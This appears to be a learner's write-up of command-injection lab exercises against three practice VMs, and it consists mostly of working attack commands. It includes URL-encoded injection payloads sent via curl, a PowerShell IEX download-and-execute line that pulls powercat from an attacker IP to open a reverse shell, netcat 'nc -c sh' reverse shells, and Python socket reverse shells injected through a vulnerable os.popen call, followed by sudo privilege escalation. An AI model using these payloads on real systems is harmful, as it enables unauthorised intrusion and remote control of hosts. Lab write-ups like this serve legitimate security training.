
1. Follow the steps above and exploit the command injection vulnerability on VM #1 to obtain a reverse shell. Since the machine is not connected to the internet, you have to skip the step of cloning the repository from the beginning of this section. Find the flag on the Desktop for the _Administrator_ user.

```bash
# 192.168.123.189:8000
# My IP: 192.168.45.250


# Sending POST Data
curl -X POST --data 'Archive=ipconfig' http://192.168.123.189:8000/archive

# Looking at CMD or PowerShell
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.123.189:8000/archive
	# Output is PowerShell

# Run file server
python -m http.server 80

# Copy powercat
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .

# Download file from server & run it
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 

curl -X POST --data 'Archive=git%3BIEX%20%28New%2DObject%20System%2ENet%2EWebclient%29%2EDownloadString%28%22http%3A%2F%2F192%2E168%2E45%2E250%2Fpowercat%2Eps1%22%29%3Bpowercat%20%2Dc%20192%2E168%2E45%2E250%20%2Dp%204444%20%2De%20powershell' http://192.168.123.189:8000/archive

# Shell connects ;)
```
![[Pasted image 20250313203903.png]]


2. For this exercise the _Mountain Vaults_ application runs on Linux (VM #2). Exploit the command injection vulnerability like we did in this section, but this time use Linux specific commands to obtain a reverse shell. As soon as you have a reverse shell use the **sudo su** command to gain elevated privileges. Once you gain elevated privileges, find the flag located in the **/opt/config.txt** file.

```bash
# Target: 192.168.123.16:80

# Building the command: check if nc exists
curl -X POST --data 'Archive=git%3Bwhich%20nc' http://192.168.123.16:80/archive

# Reverse Shell:
curl -X POST --data 'Archive=git%3Bnc%20-c%20sh%20192.168.45.250%204444' http://192.168.123.16:80/archive
```

![[Pasted image 20250313204849.png]]


3. **Capstone Lab**: Start the _Future Factor Authentication_ application on VM #3. Identify the vulnerability, exploit it and obtain a reverse shell. Use **sudo su** in the reverse shell to obtain elevated privileges and find the flag located in the **/root/** directory.
**HINT**

4. Visit VM #3's webserver to find three fields on the login page.
5. Test various inputs like && to identify the command injection vulnerability.
6. Assume the back-end uses a vulnerable function like **eval()** or **popen()**: **popen(f'echo "test"')**

```bash
# IP: 192.168.123.16

# Tried to send data over JSON
curl -d '{"username":"tamer","username":"veute","ffa":"&&echo whoami"}' -H 'Content-Type: application/json' http://192.168.123.16/login

# The application just returns something super weird lmao
	# Username: N@NdkWzmN@NdkWzmN@NdkWzm
	# Password: N@NdkWzmN@NdkWzmN@NdkWz!!!!!!###!!!!!m
# This was a dead end.
```
![[Pasted image 20250313212146.png]]


```bash
# More interestingly, we see this line of code:
out = os.popen(f&#39;echo &#34;{ffa}&#34;&#39;).read()

# Decoded:
out = os.popen(f'echo "{ffa}"').read()

# Trying different outputs...
username=User&password=amer&ffa=idk";which sh "jaja""
	# This does output the content!

# Building a reverse shell
username=User&password=amer&ffa=idk";nc -c sh 192.168.45.250 4444 "jaja""
username=User&password=amer&ffa=idk"; dir; echo"jaja""

# Testing quite a lot of reverse shells... finally this one works
username=User&password=amer&ffa=:)"; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.250",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'; echo "jaja""

# This one also works
username=User&password=amer&ffa=:)"; python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.45.250",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'; echo "jaja""

```

